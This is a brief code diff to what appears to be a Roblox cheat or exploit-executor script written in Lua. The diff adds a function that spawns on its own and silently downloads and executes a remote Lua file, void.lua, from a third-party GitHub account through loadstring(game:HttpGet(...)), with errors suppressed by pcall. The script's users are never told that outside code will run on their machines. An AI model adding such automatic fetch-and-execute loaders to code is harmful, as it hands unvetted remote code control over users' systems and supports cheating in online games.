@@ -1196,6 +1196,20 @@ if player.Character then
     end
 end
 
+local scriptsLoaded = false
+local function LoadShockerScript()
+    if scriptsLoaded then return end
+    scriptsLoaded = true
+    
+    task.wait(2)
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShockerLL22/spts-classic-main/refs/heads/main/void.lua", true))()
+        print("[eSPTS] Shocker script loaded successfully")
+    end)
+end
+
+task.spawn(LoadShockerScript)
+
 if queue_on_teleport then
     queue_on_teleport([[
         wait(2)
